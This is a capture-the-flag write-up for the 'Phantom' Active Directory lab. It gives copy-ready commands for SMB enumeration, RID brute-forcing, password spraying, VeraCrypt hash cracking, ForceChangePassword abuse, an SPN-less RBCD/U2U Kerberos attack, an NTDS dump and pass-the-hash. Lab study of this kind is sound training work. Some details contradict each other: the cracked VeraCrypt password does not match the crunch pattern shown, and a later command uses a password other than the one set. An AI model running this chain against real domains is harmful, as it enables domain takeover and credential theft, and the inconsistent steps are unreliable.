+++
date = '2026-10-27T20:04:31+01:00'
draft = false
title = 'Phantom Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`27/10/2026`**

![pwn.png](/images/imgs_phantom/pwn.png)

---

# Introduction

**_Phantom_** is a **Medium-level Windows Active Directory** environment from **VulnLab** that covers topics like custom wordlist generation and advanced **Active Directory delegation abuse**.

The exploitation path starts with anonymous **SMB** access, leading to the discovery of leaked credentials and a list of users via **RID bruteforcing**. After gaining access to a restricted share, a **VeraCrypt** volume is discovered. The difficulty shifts to extracting the hash and generating a custom wordlist based on company mutation rules to crack it.
Lateral movement involves abusing a **`ForceChangePassword`** privilege over a user account, which in turn holds **`AllowedToAct`** permissions over the **Domain Controller**. The final privilege escalation requires executing a rare **SPN-less Resource-Based Constrained Delegation attack** (**RBCD**) using the **User-to-User** (**U2U**) technique to dump the **NTDS** and achieve **System** compromise.

---

# Techniques Used

- **Anonymous SMB Enumeration**

- **Password Spraying**

- **RID Bruteforcing**

- **VeraCrypt Volume Hash Extraction & Cracking**

- **Custom Wordlist Generation (crunch)**

- **BloodHound AD Analysis**

- **ForceChangePassword Abuse**

- **SPN-less Resource-Based Constrained Delegation (RBCD)** 

- **Pass-The-Hash**

- **NTDS Dump**

---
# Enumeration

## nmap

Initial scan on all ports:

```bash
nmap -p- phantom -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV phantom -Pn
```

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-10-26 10:27:46Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: phantom.vl, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: PHANTOM
|   NetBIOS_Domain_Name: PHANTOM
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: phantom.vl
|   DNS_Computer_Name: DC.phantom.vl
|   Product_Version: 10.0.20348
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

The scan reveals a standard **Active Directory Domain Controller** setup running **Windows Server 2022** (Build **`10.0.20348`**). The domain name is **`phantom.vl`** which I immediately added to my **`/etc/hosts`** file, as well as **`dc.phantom.vl`**.

## Anonymous SMB Enumeration

I started by enumerating **SMB** shares anonymously using **NetExec**:

```bash
nxc smb phantom.vl -u 'Guest' -p '' --shares
```

![smb.png](/images/imgs_phantom/smb.png)

I found that the Public share was readable by the guest account. I connected to it using **smbclient** and downloaded all the contents:

```bash
smbclient \\\\phantom.vl\\Public -U 'guest'
mget *
```

![smb1.png](/images/imgs_phantom/smb1.png)

I found an **`.eml`** file.

**Note**: _This is a plain text format used by email clients (like **Microsoft Outlook** or **Mozilla Thunderbird**) to store the email's headers, body, and any attachments encoded in **MIME** format._

After searching for an **`.eml`** file viewer online, I read the attachment and discovered a leaked password: **`Ph4nt0m@5t4rt!`**.

![pdfpass.png](/images/imgs_phantom/pdfpass.png)

---

# Initial Access | RID Bruteforcing & Password Spraying

Before trying this password blindly, I needed a valid list of users. I used **NetExec** to perform a **RID bruteforce attack** and dumped the usernames:

```bash
nxc smb phantom.vl -u 'a' -p '' --shares --rid-brute | tee users.txt
```

To format the output into a clean userlist I used this quick bash one-liner:

```bash
cat users.txt | cut -d '\' -f2 | awk '{print $1}' | tee users_clean.txt
```

**Note**: _The **RID bruteforce** output usually formats users as **`DOMAIN\username (status)`**. By piping it into **`cut -d '\' -f2`**, we use the backslash as a delimiter to strip away the domain name. Next, **`awk '{print $1}'`** isolates the very first word of the remaining string, effectively dropping all the trailing spaces, descriptions, or status codes. Finally, **`tee`** saves the clean usernames into a new file while simultaneously displaying them on the screen._

```text
Administrator
Guest
krbtgt
svc_sspr
rnichols
pharrison
wsilva
elynch
nhamilton
lstanley
bbarnes
cjones
agarcia
ppayne
ibryant
ssteward
wstewart
vhoward
crose
twright
fhanson
cferguson
alucas
ebryant
vlynch
ghall
ssimpson
ccooper
vcunningham
```

After manually reviewing the output and cleaning the list from any default groups or non-user accounts, I used the discovered password to perform a **password spraying attack**:

```bash
nxc smb phantom.vl -u users_clean.txt -p 'Ph4nt0m@5t4rt!' --continue-on-success
```

![spray.png](/images/imgs_phantom/spray.png)

I got a hit on the user **`ibryant`**.

---
# Lateral Movement | VeraCrypt & Custom Wordlists

I checked the **SMB shares** again, this time authenticated as **`ibryant`**:

```bash
nxc smb phantom.vl -u ibryant -p 'Ph4nt0m@5t4rt!' --shares
```

![smb2.png](/images/imgs_phantom/smb2.png)

The user had access to a new share called **`Departments Share`**. I connected to it and navigated the directories:

```bash
smbclient //10.10.111.88/'Departments Share' -U phantom.vl/'ibryant%Ph4nt0m@5t4rt!'
cd IT\Backup
mget *
```

![smbackup.png](/images/imgs_phantom/smbackup.png)

I downloaded an interesting file named **`IT_BACKUP_201123.hc`**. The **`.hc`** extension belongs to **VeraCrypt** (an open-source disk encryption software).

The **VeraCrypt** volume requires a password, so we first need to extract the hash.

![required.png](/images/imgs_phantom/required.png)

I used **`dd`** to extract the first **512 bytes** of the volume, which contain the encrypted header and salt:

```bash
dd if=IT_BACKUP_201123.hc of=hc.hash bs=512 count=1
```

**Note**: _**VeraCrypt** uses **PBKDF2** for key derivation. By extracting the first **512 bytes**, we can pass it to **Hashcat** (mode **`13722`**) to perform **offline dictionary attacks**._

![hashcat.png](/images/imgs_phantom/hashcat.png)

I tried multiple standard wordlists (like **`rockyou.txt`**) against the extracted hash but got no hits. Taking a step back, I opted for a classic real-life penetration testing scenario: users frequently create passwords based on the company name, the current year, and a special character. Fun fact: when I originally played this machine on **VulnLab**, I had to figure this pattern out the hard way, as there were no hints. Now that the box has been ported to **HackTheBox**, they actually included this exact logic as an explicit hint in the **Machine Information**.

To exploit this, I used **crunch** to generate a custom wordlist applying basic mutation rules to the word "**Phantom**":

```bash
crunch 12 12 -t 'Phantom202%^' -o wordlist.txt
```

**Note**: _In crunch, the **`-t`** flag defines a pattern. Here, **`%`** inserts numbers (**0-9**) and **`^`** inserts special characters. This generates passwords like **`Phantom2020!`**, **`Phantom2023@`**, etc., which perfectly matches common corporate password policies._

I fed the custom wordlist to **Hashcat**:

```bash
hashcat -a 0 -m 13722 hc.hash wordlist.txt
```

Cracked: **`gB6XTcqVP5MlP7Rc`**.

![crack.png](/images/imgs_phantom/crack.png)

I downloaded **VeraCrypt**, mounted the **`.hc`** file using the cracked password, and inspected its contents. 

![mount.png](/images/imgs_phantom/mount.png)

Inside, I found a **`vyos_backup`** folder containing a **`config.boot`** file which revealed another set of credentials.

![clearpass.png](/images/imgs_phantom/clearpass.png)

**Password Spray**:

```bash
nxc smb phantom.vl -u users_clean.txt -p 'gB6XTcqVP5MlP7Rc' --continue-on-success
```

![spray2.png](/images/imgs_phantom/spray2.png)

It was a valid hit for **`svc_sspr`**, but I couldn't get a direct shell (**WinRM/RDP** were restricted).

---
# Privilege Escalation | ForceChangePassword Abuse & SPN-less RBCD Attack

With no direct access, I decided to map the **Active Directory** environment using **BloodHound**. I ran the **Python ingestor** using my initial foothold credentials:

```bash
bloodhound-python -u 'ibryant' -p 'Ph4nt0m@5t4rt!' -ns 10.10.111.88 -d phantom.vl -c all --zip
```

![harvers.png](/images/imgs_phantom/harvers.png)

Uploading the data to the **BloodHound GUI**, I analyzed the **Outbound Object Control** for **`svc_sspr`**.

![forcechange.png](/images/imgs_phantom/forcechange.png)

The analysis showed that **`svc_sspr`** had **`ForceChangePassword`** rights over three users: **`rnichols`**, **`wsilva`**, and **`crose`**.

Checking the outbound edges for these three users, I found something interesting: they all had **`AllowedToAct`** permissions over the **Domain Controller**.

![act.png](/images/imgs_phantom/act.png)

First, I abused the **`ForceChangePassword`** privilege to overwrite the password of **`rnichols`**:

![abuse.png](/images/imgs_phantom/abuse.png)

```bash
pth-net rpc password rnichols "stars1%" -U phantom.vl/svc_sspr%gB6XTcqVP5MlP7Rc -S phantom.vl
```

Now I controlled an account (**`rnichols`**) that had **Resource-Based Constrained Delegation** (**RBCD**) rights over the **DC**. However, there was a catch: **`rnichols`** is a **User account**, not a **Machine account**.

![abuse2.png](/images/imgs_phantom/abuse2.png)

**Note**: In a standard **RBCD attack**, we compromise an account with **`AllowedToActOnBehalfOfOtherIdentity`** over a target system. We then create a fake **Machine Account** (which inherently has an **SPN - Service Principal Name**), grant it delegation, and request a **Service Ticket** using **S4U2Self/S4U2Proxy**.
But since **`rnichols`** is a normal user without an SPN, the standard **S4U2Proxy** extension will fail. To bypass this, we must use an **SPN-less RBCD attack** via the **User-to-User** (**U2U**) **Kerberos** extension.

![quota.png](/images/imgs_phantom/quota.png)

To execute the **SPN-less RBCD**, I set up a **Python** virtual environment and installed **Impacket**:

```bash
python3 -m venv venv && . venv/bin/activate
pip3 install impacket
```

I used **impacket-rbcd** to configure the delegation:

```bash
impacket-rbcd -delegate-from 'rnichols' -delegate-to 'DC$' -dc-ip '10.10.111.88' -action 'write' 'phantom.vl'/'rnichols':'stars1%'
```

![priv1.png](/images/imgs_phantom/priv1.png)

I requested a **TGT** for **`rnichols`**, extracted the **Ticket Session Key**:

```bash
impacket-getTGT -hashes :$(pypykatz crypto nt 'stars1%') 'phantom.vl'/'rnichols'
export KRB5CCNAME=rnichols.ccache
impacket-describeTicket 'rnichols.ccache' | grep 'Ticket Session Key'
```

![priv2.png](/images/imgs_phantom/priv2.png)

```bash
impacket-changepasswd -newhashes :0b13e9062cd35e8b5c8a01d0b33e379f 'phantom.vl'/'rnichols':'stars0@'@'phantom.vl'
```

![priv3.png](/images/imgs_phantom/priv3.png)

and performed the **U2U** trick to impersonate the **Domain Administrator**:

```bash
impacket-getST -k -no-pass -u2u -impersonate "Administrator" -spn "cifs/dc.phantom.vl" 'phantom.vl'/'rnichols'
```

![priv4.png](/images/imgs_phantom/priv4.png)

This successfully granted me a **Service Ticket** for the **Administrator** account. I exported the new ccache file and used **NetExec** with the **Kerberos ticket** to **dump the NTDS**:

```bash
export KRB5CCNAME=Administrator@cifs_dc.phantom.vl@PHANTOM.VL.ccache
nxc smb dc.phantom.vl --use-kcache -M ntdsutil
```

![priv5.png](/images/imgs_phantom/priv5.png)

I got a full System shell performing a Pass-The-Hash using **psexec**:

```bash
psexec.py -hashes :aa2abd9db4f5984e657f834484512117 Administrator@phantom.vl
```

![rootf.png](/images/imgs_phantom/rootf.png)

![userf.png](/images/imgs_phantom/userf.png)

---

# Final Thoughts

**_Phantom_** is a brilliant **Active Directory** machine. The initial foothold mimics realistic corporate misconfigurations, forcing you to think like an actual employee when building the password wordlist.
The highlight of the box is undeniably the privilege escalation phase. Forcing the attacker to pivot through **ForceChangePassword** to reach an account with **AllowedToAct**, and subsequently requiring an **SPN-less RBCD attack** via **User-to-User** authentication, is a fantastic and rare learning opportunity. A highly recommended box for mastering **advanced Kerberos abuse**.

